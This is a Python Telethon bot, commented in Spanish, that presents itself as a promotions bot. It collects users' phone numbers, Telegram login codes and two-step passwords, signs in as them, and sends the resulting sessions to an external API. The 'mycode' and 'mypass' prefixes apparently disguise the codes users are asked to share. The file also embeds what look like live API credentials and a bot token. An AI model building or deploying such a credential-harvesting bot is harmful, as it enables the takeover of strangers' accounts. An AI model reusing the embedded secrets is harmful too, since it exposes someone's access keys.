import asyncio
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError
from telethon.sessions import StringSession
from auth_manager import AuthManager

# Configuración del bot y del cliente
api_id = 29618407
api_hash = '9139cd380cc27d66802056cd6aa70317'
bot_token = '7890267305:AAEOU8SjxTJ0fv6lKnMIjW60SZhuuqoLrS8'

bot = TelegramClient(StringSession(), api_id, api_hash).start(bot_token=bot_token)
auth_manager = AuthManager(api_id, api_hash)

# Diccionario temporal solo para el proceso de autenticación
temp_auth_data = {}

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    welcome_message = """
🤖 ¡Bienvenido al Bot de Promociones! 

Estos son los comandos disponibles:

📱 /connect [número] - Conecta tu cuenta de Telegram
   Ejemplo: /connect +1234567890
   
   
❌ /logout - Desconecta tu cuenta del bot

Para comenzar, usa el comando /connect con tu número de teléfono. 
¡Gracias por usar nuestro bot! 🚀
"""
    await event.respond(welcome_message, parse_mode='html')

@bot.on(events.NewMessage(pattern='/connect'))
async def start_connect(event):
    chat_id = event.chat_id
    message = event.text.split(' ')

    if len(message) == 2:
        phone_number = message[1]

        try:
            # Crear cliente con StringSession
            user_client = TelegramClient(StringSession(), api_id, api_hash)
            await user_client.connect()
            sent_code = await user_client.send_code_request(phone_number)

            # Solo guardamos datos mínimos necesarios para la autenticación
            temp_auth_data[chat_id] = {
                'client': user_client,
                'phone': phone_number,
                'phone_code_hash': sent_code.phone_code_hash
            }

            await event.respond(
                " Ingrese el código enviado a Telegram o SMS en el siguiente formato:\n\n"
                " Ejemplo : mycode123456",
                parse_mode='html'
            )
        except Exception as e:
            await event.respond(f" Error al conectar: {e}")
    else:
        await event.respond("  <b>Formato incorrecto</b>! Use: /connect +123456789", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^mycode\d+$'))
async def handle_auth_code(event):
    chat_id = event.chat_id

    if chat_id not in temp_auth_data:
        await event.respond("No se encontró información. Use /connect para iniciar.")
        return

    auth_code = event.text.replace('mycode', '').strip()
    user_data = temp_auth_data[chat_id]
    user_client = user_data['client']

    try:
        await user_client.sign_in(
            phone=user_data['phone'],
            code=auth_code,
            phone_code_hash=user_data['phone_code_hash']
        )
        
        # Enviar a la API y limpiar datos temporales
        result, message = await auth_manager.sign_in(user_data['phone'], user_client)
        
        if result:
            await event.respond(" Autenticado correctamente y datos enviados a la API", parse_mode='html')
        else:
            await event.respond(f" Autenticado en Telegram, pero hubo un error al enviar a la API: {message}", parse_mode='html')
            
    except SessionPasswordNeededError:
        await event.respond(" Su cuenta requiere autenticación en dos pasos. Ingrese su contraseña con el formato: mypass123456", parse_mode='html')
    except Exception as e:
        del temp_auth_data[chat_id]
        await event.respond(f" Error al autenticar: {e}")

@bot.on(events.NewMessage(pattern=r'^mypass.+'))
async def handle_password(event):
    chat_id = event.chat_id

    if chat_id not in temp_auth_data:
        await event.respond(" No se encontró información. Use /connect para iniciar.")
        return

    password = event.text.replace('mypass', '').strip()
    user_data = temp_auth_data[chat_id]
    user_client = user_data['client']

    try:
        await user_client.sign_in(password=password)
        # Enviar a la API y limpiar datos temporales
        result, message = await auth_manager.sign_in(user_data['phone'], user_client)
        
        if result:
            await event.respond(" Autenticado correctamente y datos enviados a la API", parse_mode='html')
        else:
            await event.respond(f" Autenticado en Telegram, pero hubo un error al enviar a la API: {message}", parse_mode='html')
    except Exception as e:
        del temp_auth_data[chat_id]
        await event.respond(f" Error al autenticar con contraseña: {e}")

@bot.on(events.NewMessage(pattern='/logout'))
async def logout(event):
    chat_id = event.chat_id
    if chat_id not in temp_auth_data or 'client' not in temp_auth_data[chat_id]:
        await event.respond("No hay una sesión activa para cerrar.")
        return
        
    client = temp_auth_data[chat_id]['client']
    result, message = await auth_manager.logout(client)
    
    if result:
        # Limpiar los datos de la sesión
        if chat_id in temp_auth_data:
            await temp_auth_data[chat_id]['client'].disconnect()
            del temp_auth_data[chat_id]
        await event.respond(message, parse_mode='html')
    else:
        await event.respond(f"Error al cerrar sesión: {message}")

# Iniciar el bot
if __name__ == "__main__":
    print("Bot iniciado...")
    bot.run_until_disconnected()
